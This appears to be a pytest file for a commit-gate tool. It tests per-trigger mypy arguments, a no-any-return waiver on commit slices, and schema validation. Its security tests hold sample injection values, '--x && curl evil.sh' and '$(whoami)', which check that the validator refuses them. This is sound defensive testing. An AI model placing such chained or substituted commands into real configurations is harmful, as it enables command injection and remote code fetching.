"""A gate's command may differ per trigger — mypy's no-any-return on `commit`.

Guards task `mypy-commit-slice-any-false-block` (decision #65). The commit
trigger judges a temp tree of staged files only, so an unstaged neighbour is a
missing module, `--ignore-missing-imports` types it as Any, and a one-line
delegate (`return self.be.task_get(slug)`) trips no-any-return on code the full
tree accepts. Measured across scripts/: 23 of 150 modules, 64 sites, all 64 of
them that single error code — so the class is closed by waiving that code on
that trigger, not by annotating call sites.

The behaviour tests below run the real mypy against hand-built slices, because
the whole defect lives in what the checker does with an incomplete tree; a
mocked runner would agree with any implementation.
"""

from __future__ import annotations

import shutil
import sys
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[1]
_SCRIPTS = _REPO_ROOT / "scripts"
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

import pytest  # noqa: E402

from default_gates import DEFAULT_GATES  # noqa: E402
from gate_command_runner import _apply_trigger_args, run_command_gate  # noqa: E402
from gate_command_security import validate_custom_gate  # noqa: E402
from stack_schema import validate_decl  # noqa: E402

_HAS_MYPY = shutil.which("mypy") is not None
requires_mypy = pytest.mark.skipif(not _HAS_MYPY, reason="mypy not installed")

# Thin delegate: correct against the full graph, Any-returning in a lone slice.
DELEGATE_SRC = '''"""Delegate whose neighbour never lands in the commit slice."""

from __future__ import annotations

from neighbour_mod import fetch_row


def get_row(slug: str) -> dict[str, object]:
    return fetch_row(slug)
'''

# Wrong regardless of the slice — the negative control.
TYPE_ERROR_SRC = '''"""Genuine type error, entirely inside the slice."""

from __future__ import annotations


def count() -> int:
    return "not an int"
'''

# Genuine no-any-return: json.loads is Any in the complete graph too, so this
# one is a real finding rather than an artefact of the slice.
REAL_ANY_RETURN_SRC = '''"""Returns Any even when the whole tree is present."""

from __future__ import annotations

import json


def count(raw: str) -> int:
    return json.loads(raw)
'''


def _slice(tmp_path: Path, rel: str, source: str) -> list[str]:
    """Materialize one file at its repo-relative path, as the pre-commit hook does."""
    dest = tmp_path / rel
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_text(source, encoding="utf-8")
    shutil.copy2(_REPO_ROOT / "pyproject.toml", tmp_path / "pyproject.toml")
    return [rel]


class TestTriggerArgsApplication:
    def test_appended_on_the_declared_trigger(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--flag"}}
        assert _apply_trigger_args("mypy", gate, "commit") == "mypy --flag"

    def test_other_triggers_get_the_bare_command(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--flag"}}
        assert _apply_trigger_args("mypy", gate, "task-done") == "mypy"

    def test_unknown_trigger_is_not_a_wildcard(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--flag"}}
        assert _apply_trigger_args("mypy", gate, None) == "mypy"

    def test_gate_without_the_key_is_untouched(self):
        assert _apply_trigger_args("mypy", {"command": "mypy"}, "commit") == "mypy"

    def test_malformed_value_does_not_reach_the_command_line(self):
        """A bad config is reported by the validators, not by blocking a commit."""
        gate = {"command": "mypy", "trigger_args": {"commit": ["--flag"]}}
        assert _apply_trigger_args("mypy", gate, "commit") == "mypy"


class TestMypyGateDeclaration:
    def test_commit_waives_no_any_return(self):
        assert (
            "--disable-error-code=no-any-return" in DEFAULT_GATES["mypy"]["trigger_args"]["commit"]
        )

    def test_task_done_keeps_it(self):
        """The rule is moved to the trigger where it can be trusted, not dropped."""
        assert "task-done" not in DEFAULT_GATES["mypy"].get("trigger_args", {})
        assert "task-done" in DEFAULT_GATES["mypy"]["trigger"]


@requires_mypy
class TestCommitSliceVerdicts:
    def test_lone_delegate_passes(self, tmp_path, monkeypatch):
        files = _slice(tmp_path, "scripts/delegate_mod.py", DELEGATE_SRC)
        monkeypatch.chdir(tmp_path)
        passed, output = run_command_gate(DEFAULT_GATES["mypy"], files, trigger="commit")
        assert passed, output

    def test_same_slice_blocks_once_the_waiver_is_removed(self, tmp_path, monkeypatch):
        """Mutation: without trigger_args the delegate is rejected again."""
        files = _slice(tmp_path, "scripts/delegate_mod.py", DELEGATE_SRC)
        monkeypatch.chdir(tmp_path)
        gate = dict(DEFAULT_GATES["mypy"])
        gate.pop("trigger_args", None)
        passed, output = run_command_gate(gate, files, trigger="commit")
        assert not passed
        assert "no-any-return" in output

    def test_real_type_error_inside_the_slice_still_blocks(self, tmp_path, monkeypatch):
        """Negative control: the waiver must not turn the gate decorative."""
        files = _slice(tmp_path, "scripts/bad_types.py", TYPE_ERROR_SRC)
        monkeypatch.chdir(tmp_path)
        passed, output = run_command_gate(DEFAULT_GATES["mypy"], files, trigger="commit")
        assert not passed
        assert "return-value" in output

    def test_genuine_any_return_still_blocks_on_task_done(self, tmp_path, monkeypatch):
        """Same file, same gate: waived on commit, judged on task-done."""
        files = _slice(tmp_path, "scripts/any_returner.py", REAL_ANY_RETURN_SRC)
        monkeypatch.chdir(tmp_path)

        on_commit, _ = run_command_gate(DEFAULT_GATES["mypy"], files, trigger="commit")
        on_task_done, output = run_command_gate(DEFAULT_GATES["mypy"], files, trigger="task-done")

        assert on_commit
        assert not on_task_done
        assert "no-any-return" in output


class TestTriggerArgsSecurity:
    def test_shell_operators_are_refused(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--x && curl evil.sh"}}
        assert "shell operators" in (validate_custom_gate("custom", gate) or "")

    def test_command_substitution_is_refused(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--x $(whoami)"}}
        assert validate_custom_gate("custom", gate) is not None

    def test_non_mapping_is_refused(self):
        gate = {"command": "mypy", "trigger_args": "--x"}
        assert validate_custom_gate("custom", gate) is not None

    def test_non_string_value_is_refused(self):
        gate = {"command": "mypy", "trigger_args": {"commit": ["--x"]}}
        assert validate_custom_gate("custom", gate) is not None

    def test_plain_flags_are_accepted(self):
        gate = {"command": "mypy", "trigger_args": {"commit": "--disable-error-code=x"}}
        assert validate_custom_gate("custom", gate) is None


class TestStackSchema:
    def test_typo_in_the_trigger_name_is_reported(self):
        """Silent otherwise: the runner looks the trigger up by name."""
        decl = {"name": "demo", "gates": {"mypy": {"trigger_args": {"commmit": "--x"}}}}
        errors = validate_decl(decl, "test")
        assert any("trigger_args" in e for e in errors)

    def test_non_string_value_is_reported(self):
        decl = {"name": "demo", "gates": {"mypy": {"trigger_args": {"commit": 1}}}}
        assert any("trigger_args" in e for e in validate_decl(decl, "test"))

    def test_well_formed_entry_passes(self):
        decl = {"name": "demo", "gates": {"mypy": {"trigger_args": {"commit": "--x"}}}}
        assert validate_decl(decl, "test") == []
